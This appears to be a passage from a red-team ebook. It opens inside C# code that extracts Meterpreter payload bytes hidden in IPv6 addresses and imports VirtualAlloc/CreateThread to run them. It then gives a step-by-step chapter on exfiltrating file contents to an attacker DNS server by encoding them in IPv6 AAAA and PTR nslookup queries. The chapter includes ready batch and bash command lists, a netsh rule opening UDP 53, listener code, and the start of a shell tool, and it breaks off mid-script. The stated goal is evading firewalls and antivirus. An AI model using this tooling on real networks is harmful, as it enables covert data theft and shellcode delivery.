(Exception e0)\n\r\n\r                    {\n\r\n\r \n\r\n\r                        Console.WriteLine(\"e0 : \" + e0.Message);\n\r\n\r                    }\n\r\n\r                    /// Getting First Line of Meterpreter Payload Lines ;)\n\r\n\r                    /// Getting First Line of Meterpreter Payload Lines ;)\n\r\n\r \n\r\n\r                }\n\r\n\r                catch (Exception e00)\n\r\n\r                {\n\r\n\r                    Console.WriteLine(\"e00 : \" + e00.Message);                    \n\r\n\r                }\n\r\n\r \n\r\n\r                /// Getting Line by Line Payloads  ;)\n\r\n\r                /// line17 ==&gt;   fe80:1111:1c49:1d0:418b:488:4801:ae17\n\r\n\r                /// line18 ==&gt;   fe80:1111:d041:5841:585e:595a:4158:ae18\n\r\n\r                /// fe80:1111:4a4a:4d31:c948:31c0:ac3c:ae4  ====&gt; {fe80:1111:}{4a4a:4d31:c948:31c0:ac3c}{:ae4}\n\r\n\r                /// Static Address octet = {fe80:1111:} , Payload [10 bytes] = {4a4a:4d31:c948:31c0:ac3c} , Counter Lines = {:ae4}            \n\r\n\r                /// Getting Line by Line Payloads  ;)\n\r\n\r                try\n\r\n\r                {\n\r\n\r                    string result_Line_X = \"\";\n\r\n\r                    int end = 0;\n\r\n\r                    for (int xx = breakpoint_1+1 ; xx &lt; All_lines.Length; xx++ )\n\r\n\r                    {\n\r\n\r                        if (xx &lt; All_lines.Length)\n\r\n\r                        {\n\r\n\r                            end = All_lines[xx].LastIndexOf(\"\\r\\n\");\n\r\n\r                        }\n\r\n\r                        else if (xx == All_lines.Length - 1)\n\r\n\r                        {\n\r\n\r                            end = All_lines[xx].LastIndexOf(\"\\r\\n\\r\\n\");\n\r\n\r                        }\n\r\n\r                        result_Line_X = All_lines[xx].Substring(2, end - 2);\n\r\n\r                        Console.WriteLine();\n\r\n\r                        Console.ForegroundColor = ConsoleColor.DarkGreen;\n\r\n\r                           \n\r\n\r                        // Debug only {show address}\n\r\n\r                        //Console.WriteLine(result_Line_X);                                               \n\r\n\r \n\r\n\r                        /// normalize Address 0:0:0 ==&gt; 0000:0000:0000\n\r\n\r                        /// normalize Address 0:0:0 ==&gt; 0000:0000:0000\n\r\n\r                        string[] temp_normalize = result_Line_X.Split(\':\');\n\r\n\r \n\r\n\r                        /// finding hidden zero in adress octets ;)\n\r\n\r                        for (int ix = 0; ix &lt; temp_normalize.Length; ix++)\n\r\n\r                        {\n\r\n\r                            int count = temp_normalize[ix].Length;\n\r\n\r                            Console.ForegroundColor = ConsoleColor.DarkGreen;\n\r\n\r                            if (count &lt; 4)\n\r\n\r                            {\n\r\n\r                                Console.ForegroundColor = ConsoleColor.Green;\n\r\n\r                                for (int j = 0; j &lt; 4 - count; j++)\n\r\n\r                                {\n\r\n\r                                    temp_normalize[ix] = \"0\" + temp_normalize[ix];\n\r\n\r                                }\n\r\n\r                            }\n\r\n\r                            if (ix == temp_normalize.Length - 1) { Console.ForegroundColor = ConsoleColor.DarkCyan; }\n\r\n\r                            if (ix &lt; temp_normalize.Length - 6 &amp;&amp; ix &gt;= temp_normalize.Length - 8) { Console.ForegroundColor = ConsoleColor.DarkCyan; }\n\r\n\r                            if (ix == temp_normalize.Length - 2 || ix == temp_normalize.Length - 3 || ix == temp_normalize.Length - 4 || ix == temp_normalize.Length - 5 || ix == temp_normalize.Length - 6) \n\r\n\r                            {\n\r\n\r                                //// dump Injected Payloads from IPv6 Address to List ;)\n\r\n\r                                //// Note this code supported only 99 * 10 = 990 bytes payload \n\r\n\r                                //// you can change here to getting more than 990 bytes \n\r\n\r \n\r\n\r                                if (temp_normalize[7].StartsWith(\"ae\"))\n\r\n\r                                {\n\r\n\r                                    object[] __X = { Convert.ToInt32(temp_normalize[7].Remove(0, 2)), temp_normalize[ix] };\n\r\n\r                                    _IPV6_IPAddress_Payloads.Rows.Add(__X);\n\r\n\r \n\r\n\r                                }\n\r\n\r                                else if (temp_normalize[7].StartsWith(\"0ae\"))\n\r\n\r                                {\n\r\n\r                                    object[] __X = { Convert.ToInt32(temp_normalize[7].Remove(0, 3)), temp_normalize[ix] };\n\r\n\r                                    _IPV6_IPAddress_Payloads.Rows.Add(__X);\n\r\n\r                                }\n\r\n\r                                //// you can change here to getting more than 990 bytes \n\r\n\r \n\r\n\r                                //else if (temp_normalize[7].StartsWith(\"a\"))\n\r\n\r                                //{\n\r\n\r                                //    object[] __X = { Convert.ToInt32(temp_normalize[7].Remove(0, 1)), temp_normalize[ix] };\n\r\n\r                                //    _IPV6_IPAddress_Payloads.Rows.Add(__X);\n\r\n\r                                //}                            \n\r\n\r \n\r\n\r                            }\n\r\n\r                            Console.Write(temp_normalize[ix] + \" \");\n\r\n\r \n\r\n\r \n\r\n\r                            // checking Bytes and Sorting\n\r\n\r                            last_octet_tmp = \"\";\n\r\n\r                            if (ix == temp_normalize.Length - 1)\n\r\n\r                            {\n\r\n\r                                // this is last octet of IPv6 address\n\r\n\r                                last_octet_tmp += temp_normalize[ix];\n\r\n\r \n\r\n\r                            }\n\r\n\r                        }\n\r\n\r                        // Debug only {show address}\n\r\n\r                        Console.WriteLine(\" ==&gt; \" + result_Line_X);\n\r\n\r                        //Console.WriteLine();\n\r\n\r                        try\n\r\n\r                        {\n\r\n\r                            //last_octet_tmp = String.Format(\"{0:x2}{1:x2}{2:x2}\");\n\r\n\r                            if (last_octet_tmp.StartsWith(\"ae\"))\n\r\n\r                            {\n\r\n\r                              \n\r\n\r                                PayloadLines_current_id = Convert.ToInt32(last_octet_tmp.ToString().Remove(0, 2));\n\r\n\r                              \n\r\n\r                                Final_payload_count++;\n\r\n\r                            }\n\r\n\r                            else if (last_octet_tmp.StartsWith(\"0ae\"))\n\r\n\r                            {\n\r\n\r                              \n\r\n\r                                PayloadLines_current_id = Convert.ToInt32(last_octet_tmp.ToString().Remove(0, 3));\n\r\n\r                              \n\r\n\r                                Final_payload_count++;\n\r\n\r                            }\n\r\n\r                        }\n\r\n\r                        catch (Exception e1)\n\r\n\r                        {\n\r\n\r                            Console.WriteLine(\"e1 : \" + e1.Message);\n\r\n\r \n\r\n\r                        }                       \n\r\n\r                        /// normalize Address 0:0:0 ==&gt; 0000:0000:0000\n\r\n\r                        /// normalize Address 0:0:0 ==&gt; 0000:0000:0000\n\r\n\r                    }\n\r\n\r                    Console.WriteLine(\"PAYLOAD Lines Count: \"+Final_payload_count.ToString());\n\r\n\r                }\n\r\n\r                catch (Exception e4)\n\r\n\r                {\n\r\n\r \n\r\n\r                    Console.WriteLine(\"e4 : \" + e4.Message);\n\r\n\r                }\n\r\n\r              \n\r\n\r            }\n\r\n\r            catch (Exception e)\n\r\n\r            {             \n\r\n\r                Console.WriteLine(e.Message);                           \n\r\n\r            }\n\r\n\r          \n\r\n\r        }\n\r\n\r               \n\r\n\r        public static UInt32 MEM_COMMIT = 0x1000;\n\r\n\r        public static UInt32 PAGE_EXECUTE_READWRITE = 0x40;\n\r\n\r \n\r\n\r        [DllImport(\"kernel32\")]\n\r\n\r        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);\n\r\n\r        [DllImport(\"kernel32\")]\n\r\n\r        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);\n\r\n\r        [DllImport(\"kernel32\")]\n\r\n\r        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);     \n\r\n\r \n\r\n\r    }\n\r\n\r}\n\r\n\r ","","topics\\Chapter 6.html","\n\r\n\r \n\r\n\rExfiltration and Uploading DATA by DNS Traffic (IPv6 AAAA/PTR Queries)\n\r\n\rUnderstanding this method \n\r\n\rIn this chapter I want to explain how can Send DATA to Attacker Server by DNS Traffic in this method you can send Data via Nslookup and IPv6 Addresses to DNS Server so this is one way for DATA Exfiltration. \n\r\n\rNote : In this Method you can use IPv6 Addresses as Payload and in server Side you can Download these DATA via Dumping IPv6 PTR Queries .\n\r\n\rAgain Why DNS protocol?\n\r\n\rBecause DNS traffic in the most networks are available without monitoring or Filtering by IPS/IDS or hardware firewalls .\n\r\n\rIn this article I want to show you one way for Exfiltration DATA from (client side) by sending DNS Request “IPv6 Addresses , AAAA records” over Network also dumping these DATA via DNS IPv6 PTR Queries (server side).\n\r\n\rHow can do this ?\n\r\n\rfirst you need to imagine this Payload or Text DATA for example :\n\r\n\r“this is my test for reading File (Bytes) and Making IPV6 AAAA Requests so let me test it ;) by RedBudTree !@#$%^ ”\n\r\n\rso in this technique I want to use IPv6 Addresses as Payloads for Sending or Uploading DATA to DNS Server so we will have IPv6 DNS (AAAA Records) only in our Traffic.\n\r\n\rNote : in this Technique our Payloads will inject to IPv6 Addresses “128 Bits”  also Detecting this Method by Firewalls or AV is Difficult.\n\r\n\rSo how we can inject this text to (16 Bytes) IPv6 Addresses ?\n\r\n\rSTEP 1: first of all we should convert our Text to Bits also we should chunk them to (128 bits or 16 bytes):\n\r\n\r16 bytes Text == Convert to bytes == &gt; 16 bytes\n\r\n\r“this is my test “   == Convert to (16 Bytes or 128 bits) ==&gt;  74 68 69 73 20 69 73 20 6d 79 20 74 65 73 74 20\n\r\n\rso we will have something like this :\n\r\n\r“t    h    I    s       I    s        m  y        t    e    s   t  “\n\r\n\r  74 68 69 73 20 69 73 20 6d 79 20 74 65 73 74 20\n\r\n\r“t” = 74 , “h” = 68 , “I” = 69 , “s” = 73 , “ “ = 20 , “I” = 69 , “s” = 73 , …..\n\r\n\rnow you can understand what exactly will happens in this step :\n\r\n\r128 bits or 16 bytes Text (DATA)  == Convert Text to bytes == &gt;  128 Bits or 16 Bytes (DATA)\n\r\n\r“this is my test “ ==&gt; 74686973206973206d79207465737420\n\r\n\r“for reading File” ==&gt; 666f722072656164696e672046696c65\n\r\n\r“ (Bytes) and Mak” ==&gt; 202842797465732920616e64204d616b\n\r\n\r“ing IPV6 AAAA Re” ==&gt; 696e6720495056362041414141205265\n\r\n\r“quests so let m” ==&gt; 7175657374730d0a736f206c6574206d\n\r\n\r“e test it ;) by “ ==&gt; 652074657374206974203b2920627920\n\r\n\r“RedBudTree !@#$%” ==&gt; 52656442756454726565202140232425\n\r\n\r“^ ” ==&gt; 5e20000000000000000\n\r\n\r \n\r\n\rSTEP 2 : Injecting Bytes to IPV6 Addresses via DNS AAAA Records and Nslookup Command for Exfiltration : \n\r\n\rnow we need to think about this : how can use these Bytes as IPv6 Addresses ? also how can Send these Bytes to Attacker DNS Server via AAAA Records (server side : IPv6 PTR Queries) and using DNS Traffic ?\n\r\n\rSo in this “Step2” we should send these bytes to Attacker DNS Server via (IPv6 Addresses or AAAA Records) so we can do this via NSLOOKUP Command:\n\r\n\r \n\r\n\r\n\r\n\rHow ?\n\r\n\rIn this time we will have something like this for sending DATA to Attacker DNS Server.\n\r\n\rNote: Attacker DNS Server IPv4 Address is “192.168.56.101”\n\r\n\r128 Bits (DATA) == Convert to Text ==&gt; Text (DATA)\n\r\n\r\n\r1.Text1 : 74686973206973206d79207465737420  ==&gt; “this is my test “ \n\r\n\r\n\r\n\r•sending “Text1” via DNS AAAA Records to Attacker DNS Server and Nslookup Command for this is : \n\r\n\r\n\r◦nslookup -type=aaaa 7468:6973:2069:7320:6d79:2074:6573:7420   192.168.56.101  |  find \"\" \n\r\n\r\n\r\n\r\n\r2.Text2 : 666f722072656164696e672046696c65  ==&gt; “for reading File” \n\r\n\r\n\r\n\r•sending “Text2” via DNS AAAA Records to Attacker DNS Server and Nslookup Command for this is : \n\r\n\r\n\r◦nslookup -type=aaaa 666f:7220:7265:6164:696e:6720:4669:6c65   192.168.56.101  |  find \"\" \n\r\n\r\n\r\n\r\n\r3.Text3 : 202842797465732920616e64204d616b  ==&gt; “ (Bytes) and Mak” \n\r\n\r\n\r\n\r•sending “Text3” via DNS AAAA Records to Attacker DNS Server and Nslookup Command for this is : \n\r\n\r\n\r◦nslookup -type=aaaa 2028:4279:7465:7329:2061:6e64:204d:616b   192.168.56.101  |  find \"\" \n\r\n\r\n\r\n\r\n\r4.Text4 : 696e6720495056362041414141205265  ==&gt; “ing IPV6 AAAA Re” \n\r\n\r\n\r\n\r•sending “Text4” via DNS AAAA Records to Attacker DNS Server and Nslookup Command for this is : \n\r\n\r\n\r◦nslookup -type=aaaa 696e:6720:4950:5636:2041:4141:4120:5265   192.168.56.101  |  find \"\" \n\r\n\r\n\r\n\r\n\r5.Text5 : 7175657374730d0a736f206c6574206d ==&gt; “quests so let m” \n\r\n\r\n\r\n\r•sending “Text5” via DNS AAAA Records to Attacker DNS Server and Nslookup Command for this is : \n\r\n\r\n\r◦nslookup -type=aaaa 7175:6573:7473:0d0a:736f:206c:6574:206d   192.168.56.101  |  find \"\" \n\r\n\r\n\r\n\r\n\r6.Text6 : 652074657374206974203b2920627920 ==&gt; “e test it ;) by “ \n\r\n\r\n\r\n\r•sending “Text6” via DNS AAAA Records to Attacker DNS Server and Nslookup Command for this is : \n\r\n\r\n\r◦nslookup -type=aaaa 6520:7465:7374:2069:7420:3b29:2062:7920   192.168.56.101  |  find \"\" \n\r\n\r\n\r\n\r\n\r7.Text7 : 52656442756454726565202140232425  ==&gt; “RedBudTree !@#$%” \n\r\n\r\n\r\n\r•sending “Text7” via DNS AAAA Records to Attacker DNS Server and Nslookup Command for this is : \n\r\n\r\n\r◦nslookup -type=aaaa 5265:6442:7564:5472:6565:2021:4023:2425   192.168.56.101  |  find \"\" \n\r\n\r\n\r\n\r\n\r8.Text8 : 5e20000000000000000 ==&gt; “^ ” \n\r\n\r\n\r\n\r•sending “Text8” via DNS AAAA Records to Attacker DNS Server and Nslookup Command for this is : \n\r\n\r\n\r◦nslookup -type=aaaa 5e20:0:0:0:0:0:0:0   192.168.56.101  |  find \"\" \n\r\n\r\n\r\n\rso for Sending or Uploading (Exfiltration) this Text or (DATA): “this is my test for reading File (Bytes) and Making IPV6 AAAA Requests so let me test it ;) by RedBudTree !@#$%^ ” to Attacker DNS Server with IPv4 Address 192.168.56.101 via DNS AAAA Records we need these Nslookup Commands as you can see in “Dns.bat” file :\n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\r\n\r\n\rDns.bat file :\n\r\n\rnslookup -type=aaaa  7468:6973:2069:7320:6d79:2074:6573:7420 192.168.56.101 | find \"\"\n\r\n\rnslookup -type=aaaa  666f:7220:7265:6164:696e:6720:4669:6c65 192.168.56.101 | find \"\"\n\r\n\rnslookup -type=aaaa  2028:4279:7465:7329:2061:6e64:204d:616b 192.168.56.101 | find \"\"\n\r\n\rnslookup -type=aaaa  696e:6720:4950:5636:2041:4141:4120:5265 192.168.56.101 | find \"\"\n\r\n\rnslookup -type=aaaa  7175:6573:7473:0d0a:736f:206c:6574:206d 192.168.56.101 | find \"\"\n\r\n\rnslookup -type=aaaa  6520:7465:7374:2069:7420:3b29:2062:7920 192.168.56.101 | find \"\"\n\r\n\rnslookup -type=aaaa  5265:6442:7564:5472:6565:2021:4023:2425 192.168.56.101 | find \"\"\n\r\n\rnslookup -type=aaaa  5e20:0:0:0:0:0:0:0 192.168.56.101 | find \"\"\n\r\n\r \n\r\n\ror in linux with Bash script :\n\r\n\r #!/bin/bash\n\r\n\rnslookup -type=aaaa  7468:6973:2069:7320:6d79:2074:6573:7420 192.168.56.101 | grep \"\";\n\r\n\rnslookup -type=aaaa  666f:7220:7265:6164:696e:6720:4669:6c65 192.168.56.101 | grep \"\";\n\r\n\rnslookup -type=aaaa  2028:4279:7465:7329:2061:6e64:204d:616b 192.168.56.101 | grep \"\";\n\r\n\rnslookup -type=aaaa  696e:6720:4950:5636:2041:4141:4120:5265 192.168.56.101 | grep \"\";\n\r\n\rnslookup -type=aaaa  7175:6573:7473:0d0a:736f:206c:6574:206d 192.168.56.101 | grep \"\";\n\r\n\rnslookup -type=aaaa  6520:7465:7374:2069:7420:3b29:2062:7920 192.168.56.101 | grep \"\";\n\r\n\rnslookup -type=aaaa  5265:6442:7564:5472:6565:2021:4023:2425 192.168.56.101 | grep \"\";\n\r\n\rnslookup -type=aaaa  5e20:0:0:0:0:0:0:0 192.168.56.101 | grep \"\";\n\r\n\r \n\r\n\rNote: for using this Bash script for linux (Step5 : Client Side) you should change “find” to “grep” manually and it means you can use this bash script in (Step5 : Client side) with Linux based system and your (Attacker Side) will be Windows Based System. If you used Linux based System as Client-Side for sending DATA via this Bash script you will have something like “Picture 3” in attacker-side with “Listening Mode” in windows based system.\n\r\n\r \n\r\n\rnow in Attacker Side an attacker can dump these bytes very simple just with monitoring DNS Log files or monitoring DNS AAAA Queries also you can do this without DNS Server it means you can do this only by Monitoring UDP Port 53 for IPv4 192.168.56.101 so I did this by this method and I made one C# Code “RedbudTree.cs” for making these Nslookup command for Sending DATA also by this code you can Have monitoring Mode over UDP Port 53 for Listening to DNS Queries so by this code you can Upload your DATA also with this code with “Listening Mode” you can see dumped DATA (Server Side) . \n\r\n\rNote : In this Article I do not want to explain C# Code line by line because this code is simple but I will show you how you can work with this code very simple.\n\r\n\rUsing RedbudTree.exe tool Step by step :\n\r\n\rStep 1: first you need to compiling C# code by this Command (RunAs Admin):\n\r\n\r\n\r•c:\\&gt; csc.exe /out:RedbudTree.exe  RedbudTree.cs \n\r\n\r\n\rStep 2 (Client Side) : in this step you need to make Nslookup Commands for Exfiltration by “RedbudTree.exe” tool.\n\r\n\rFor doing this you can use Switch “AAAA and File “ like this syntax :\n\r\n\r\n\r•Syntax : RedbudTree.exe aaaa file File-Name.txt \n\r\n\r\n\r•Example : RedbudTree.exe aaaa file Test.txt \n\r\n\r\n\ras you can see in “Picture 1” I made one Text File “Test.txt” also I made Nslookup Commands for Sending this Text file via DNS AAAA Records and DNS Traffic by “ RedbudTree.exe AAAA FILE TEST.TXT ” command.\n\r\n\rSo my output was something like these commands :\n\r\n\rnslookup -type=aaaa  7468:6973:2069:7320:6d79:2074:6573:7420 192.168.56.101 | find \"\"\n\r\n\rnslookup -type=aaaa  666f:7220:7265:6164:696e:6720:4669:6c65 192.168.56.101 | find \"\"\n\r\n\rnslookup -type=aaaa  2028:4279:7465:7329:2061:6e64:204d:616b 192.168.56.101 | find \"\"\n\r\n\rnslookup -type=aaaa  696e:6720:4950:5636:2041:4141:4120:5265 192.168.56.101 | find \"\"\n\r\n\rnslookup -type=aaaa  7175:6573:7473:0d0a:736f:206c:6574:206d 192.168.56.101 | find \"\"\n\r\n\rnslookup -type=aaaa  6520:7465:7374:2069:7420:3b29:2062:7920 192.168.56.101 | find \"\"\n\r\n\rnslookup -type=aaaa  5265:6442:7564:5472:6565:2021:4023:2425 192.168.56.101 | find \"\"\n\r\n\rnslookup -type=aaaa  5e20 \n\r\n\r \n\r\n\ras you can see I had 8 lines Command and in last line I had this one :\n\r\n\r\n\r•nslookup -type=aaaa  5e20  \n\r\n\r\n\r \n\r\n\rso in this line you should change this command to this one manually :\n\r\n\r\n\r•nslookup -type=aaaa  5e20:0:0:0:0:0:0:0 192.168.56.101 | find “”  \n\r\n\r\n\r \n\r\n\rwhy ?\n\r\n\r \n\r\n\rBecause for each IPv6 Address you need something like this : \n\r\n\r \n\r\n\rIPv6        :   xxxx:xxxx:xxxx:xxxx:xxxx:xxxx:xxxx:xxxx \n\r\n\rExample :   5265:6442:7564:5472:6565:2021:4023:2425\n\r\n\r \n\r\n\rso in this case our IPv6 was 5e20:x:x:x:x:x:x:x and we should change it to 5e20:0:0:0:0:0:0:0 manually and in this step you should copy these 8 lines to one “BAT” file for example “Demo.bat”.\n\r\n\r  \n\r\n\rPicture 1:\n\r\n\rStep 3 (Attacker Side) : in this step you need to use RedbudTree.exe for “Listening Mode” in Attacker side for Receiving Queries but before that you need to use this commands with “RunAs Admin” in your Windows for Opening UDP Port 53 in Firewall.\n\r\n\rfor using \"Listener Mode\" UDP Port 53 should be opened before using this tool and windows command for opening UDP port 53 is (RunAs Admin):  \n\r\n\r\n\r•netsh advfirewall firewall add rule name=\"UDP 53\" dir=in action=allow protocol=UDP localport=53 \n\r\n\r\n\rStep 4 (Attacker Side) : in this step you can use RedbudTree.exe tool for listening DNS Queries in Attacker Side “Listening Mode” or (DNS Queries Listener) so in this time you should Run this Tool without using Switch :\n\r\n\r\n\r•C:\\&gt; RedbudTree.exe \n\r\n\r\n\rStep 5 (Client Side) : Finally in this step you can run Nslookup Commands by “Demo.bat” file in client Side for uploading DATA via DNS AAAA Records and DNS Traffic to Attacker Server in this case “192.168.56.101” or (DNS Queries Listener)\n\r\n\ras you can see in “Picture 2” we will get DNS Queries via Monitoring (UDP Port 53) after execute “Demo.bat”.\n\r\n\r  \n\r\n\r\n\r\n\r Picture 2: \n\r\n\rPicture 3:\n\r\n\rSome important points for this C# Code :\n\r\n\rthis C# Code is very simple but some Points in this code was important point so let me talk about them :\n\r\n\r1.Using Async Method to Listening UDP Port 53 via  Async_UDP_Data_Receive :\n\r\n\rwith this Method Async_UDP_Data_Receive() in this code we can have one Listener for DNS Queries over UDP Port 53.\n\r\n\r              string UDP_DATA = Encoding.ASCII.GetString(UDP_Rec_Bytes);\n\r\n\r \n\r\n\rwith this code you will have String for Received DNS Queries , it mens with this code you can convert these Bytes to String very simple then if your String contain something like “IP6” it means you Received DNS IP6 Query . \n\r\n\r  if (UDP_DATA.ToUpper().Contains(\"IP6\"))\n\r\n\r            {\n\r\n\r                isIPV6 = true;\n\r\n\r \n\r\n\rwith this code you will have Reverse string for each IPv6 Query ...\n\r\n\r Console.Write(\"[{0}] IPv6 DNS Request is : \", DateTime.Now.ToString());\n\r\n\r                Console.ForegroundColor = ConsoleColor.Green;\n\r\n\r                string _Raw = \"\";\n\r\n\r                int BreakTime = 0;\n\r\n\r                for (int jj = cc - 1; jj &gt;= 0; jj--)\n\r\n\r                {\n\r\n\r                    if (init)\n\r\n\r                    {                        \n\r\n\r                        Console.Write(Temp[jj]);\n\r\n\r                        if (Temp[jj] != \'\\0\') _Raw += Temp[jj];\n\r\n\r                    }\n\r\n\r                    if (Temp[jj] == \'i\') init = true;                   \n\r\n\r                    if (BreakTime &gt; 75) break;\n\r\n\r                    BreakTime++;\n\r\n\r                }\n\r\n\r \n\r\n\rfinally with this code you will have Chars behind each Bytes of IPv6 PTR Query very simple .\n\r\n\r   byte[] RAW = new byte[16];\n\r\n\r                int kk = 0;\n\r\n\r                for (int k = 0; k &lt; _Raw.Length / 2;)\n\r\n\r                {\n\r\n\r                    RAW[k] = byte.Parse(_Raw.Substring(kk, 2), System.Globalization.NumberStyles.HexNumber);\n\r\n\r                    k++;\n\r\n\r                    kk++;\n\r\n\r                    kk++;\n\r\n\r                }\n\r\n\r                Console.ForegroundColor = ConsoleColor.DarkGreen;\n\r\n\r                Console.WriteLine();\n\r\n\r                Console.Write(\"[{0}] Dumping DATA from this IPv6 Address :\", DateTime.Now.ToString());\n\r\n\r                Console.ForegroundColor = ConsoleColor.Green;\n\r\n\r                Console.Write(UTF8Encoding.ASCII.GetChars(RAW));\n\r\n\r                Console.WriteLine();                \n\r\n\r \n\r\n\rand here in “main” Code with this Code your “Async” Method called every second , your main code will break via ( Ctrl + C ) :\n\r\n\r  while (true)\n\r\n\r                {\n\r\n\r                    try\n\r\n\r                    {\n\r\n\r                        UDP_53_Init.BeginReceive(Async_UDP_Data_Receive, new object());\n\r\n\r                        System.Threading.Thread.Sleep(1000);\n\r\n\r                    }\n\r\n\r                    catch (Exception omg)\n\r\n\r                    {\n\r\n\r                        Console.WriteLine(\"[!] Maybe you need to this command before Running RedBudTree \\\"Listening Mode\\\" :\");\n\r\n\r                        Console.WriteLine(\"[!] netsh advfirewall firewall add rule name=\\\"UDP 53\\\" dir=in action=allow protocol=UDP localport=53\");\n\r\n\r                        Console.WriteLine(\"[X] \" + omg.Message);\n\r\n\r                    }\n\r\n\r                }\n\r\n\r \n\r\n\rNote : C# Code for “RedbudTree.cs” is very simple so I don\'t think we need to talk more than this about C# code .\n\r\n\rusing this method on Linux systems (only) \n\r\n\rfor Linux I made simple Script “NativePayload_IP6DNS.sh” , we talked about this in previous “chapter 6” for AAAA record , now we should talk about “PTR queries” :\n\r\n\rso these are syntaxes for this script and in this case we should talk about “Example A-Step1 and  Example A-Step2”.\n\r\n\rNativePayload_IP6DNS.sh Syntax :\n\r\n\r \n\r\n\r        Example A-Step1: (Server Side ) ./NativePayload_IP6DNS.sh -r\n\r\n\r        Example A-Step2: (Client Side ) ./NativePayload_IP6DNS.sh -u text.txt DNSMASQ_IPv4 [delay] (sec) [address] xxxx:xxxx\n\r\n\r        example IPv4:192.168.56.110 : ./NativePayload_IP6DNS.sh -r\n\r\n\r        example IPv4:192.168.56.111 : ./NativePayload_IP6DNS.sh -u text.txt 192.168.56.110 delay 0 address fe81:2222\n\r\n\r        Description: with A-Step1 you will make DNS Server , with A-Step2 you can Send text file via IPv6 PTR Queries to DNS server\n\r\n\r        \n\r\n\r        Example B-Step1: (Server Side ) ./NativePayload_IP6DNS.sh -d makedns test.txt mydomain.com [address] xxxx:xxxx\n\r\n\r        Example B-Step2: (Client Side ) ./NativePayload_IP6DNS.sh -d getdata mydomain.com DNSMASQ_IPv4\n\r\n\r        example IPv4:192.168.56.110 : ./NativePayload_IP6DNS.sh -d makedns text.txt google.com address fe80:1234\n\r\n\r        example IPv4:192.168.56.111 : ./NativePayload_IP6DNS.sh -d getdata google.com 192.168.56.110\n\r\n\r        Description: with B-Step1 you will have DNS Server , with B-Step2 you can Dump test.txt file from server via IPv6 AAAA record Query\n\r\n\r \n\r\n\r \n\r\n\rExample A-step1:\n\r\n\rwith Example A-step1 you can have simple DNS server to Listening to IPv6 DNS PTR Queries so for first step you should use this command “./NativePayload_IP6DNS.sh -r” , by this command every PTR queries will dump for Converting from Bytes to String very simple .\n\r\n\r \n\r\n\r\n\r\n\rExample A-step2:\n\r\n\rnow in this step you can send DATA via Nslookup Command (Data Exfiltration). For doing this only you need to use this syntax :\n\r\n\r \n\r\n\r\n\r•./NativePayload_IP6DNS.sh -u text.txt DNSMASQ_IPv4 [delay] (sec) [address] xxxx:xxxx \n\r\n\r\n\r \n\r\n\rwith this syntax you send Data for Text file to Target DNS server via IPv6 PTR Queries by Delay and Default Address. \n\r\n\rPicture 4:\n\r\n\ras you can see in this “Picture 4”  with this script I sent this text file “mytext.txt” from Client to server via IPv6 PTR Queries by Nslookup Command very simple and finally this Text file Saved to Server side by “ExfilDump.txt” file.\n\r\n\r \n\r\n\rat a glance : IPv6 traffic is good way for DATA Exfiltration and in this method you can use IPv6 Addresses as Payload for DATA transferring or DATA Exfiltration to Attacker DNS Server or (Fake DNS Server) also detecting this method is Difficult when you want to use DNS AAAA records as Payload.\n\r\n\r\n\r\n\r\n\r•Video [1] (step by step) : https://www.youtube.com/watch?v=9jiry5b-oPo \n\r\n\r\n\r•Source Code (C#) : https://github.com/DamonMohammadbagher/RedbudTree \n\r\n\r\n\rNativePayload_IP6DNS.sh\n\r\n\r #!/bin/sh\n\r\n\recho\n\r\n\recho \"NativePayload_IP6DNS.sh , Published by Damon Mohammadbagher 2017-2018\" \n\r\n\recho \"Injecting/Downloading/Uploading DATA to DNS Traffic via IPv6 DNS AAAA/PTR Records\"\n\r\n\recho \"help syntax: ./NativePayload_IP6DNS.sh help\"\n\r\n\recho\n\r\n\r        if [ $1 == \"help\" ] \n\r\n\r        then\n\r\n\r        tput setaf 2;\n\r\n\r        echo\n\r\n\r        echo \"Example A-Step1: (Server Side ) ./NativePayload_IP6DNS.sh -r\"\n\r\n\r        echo \"Example A-Step2: (Client Side ) ./NativePayload_IP6DNS.sh -u text.txt DNSMASQ_IPv4 [delay] (sec) [address] xxxx:xxxx\"\n\r\n\r        echo \"example IPv4:192.168.56.110 : ./NativePayload_IP6DNS.sh -r\"\n\r\n\r        echo \"example IPv4:192.168.56.111 : ./NativePayload_IP6DNS.sh -u text.txt 192.168.56.110 delay 0 address fe81:2222\"\n\r\n\r        echo \"Description: with A-Step1 you will make DNS Server , with A-Step2 you can Send text file via IPv6 PTR Queries to DNS server\"\n\r\n\r        echo\n\r\n\r        echo \"Example B-Step1: (Server Side ) ./NativePayload_IP6DNS.sh -d makedns test.txt mydomain.com [address] xxxx:xxxx\"\n\r\n\r        echo \"Example B-Step2: (Client Side ) ./NativePayload_IP6DNS.sh -d getdata mydomain.com DNSMASQ_IPv4\"\n\r\n\r        echo \"example IPv4:192.168.56.110 : ./NativePayload_IP6DNS.sh -d makedns text.txt google.com address fe80:1234\"\n\r\n\r        echo \"example IPv4:192.168.56.111 : ./NativePayload_IP6DNS.sh -d getdata google.com 192.168.56.110\"\n\r\n\r        echo \"Description: with B-Step1 you will have DNS Server , with B-Step2 you can Dump test.txt file from server via IPv6 AAAA record Query\"\n\r\n\r        echo\n\r\n\r        fi\n\r\n\r \n\r\n\r        # uploading data via PTR queries (Client Side \"A\")\n\r\n\r        if [ $1 == \"-u\" ] \n\r\n\r        then\n\r\n\r                ###########\n\r\n\r                DefAddr=\"fe80:1111\"\n\r\n\r                if [ $6 == \"address\" ] \n\r\n\r                        then\n\r\n\r                        DefAddr=$7\n\r\n\r                        elif [ $6 == null ]\n\r\n\r                        then\n\r\n\r                        DefAddr=\"fe80:1111\"\n\r\n\r                fi\n\r\n\r                delaytime=0\n\r\n\r                if [ $4 == \"delay\" ] \n\r\n\r                        then\n\r\n\r                        delaytime=$5\n\r\n\r                        elif [ $4 == null ]\n\r\n\r                        then\n\r\n\r                        delaytime=0\n\r\n\r                fi\n\r\n\r \n\r\n\r                c=0                \n\r\n\r                octets=\"\"\n\r\n\r                tput setaf 9;\n\r\n\r                #echo \" \" &gt; DnsHost.txt\n\r\n\r                #echo \" \" &gt; TempDnsHost.txt\n\r\n\r                RecordsIDcounter=0\n\r\n\r                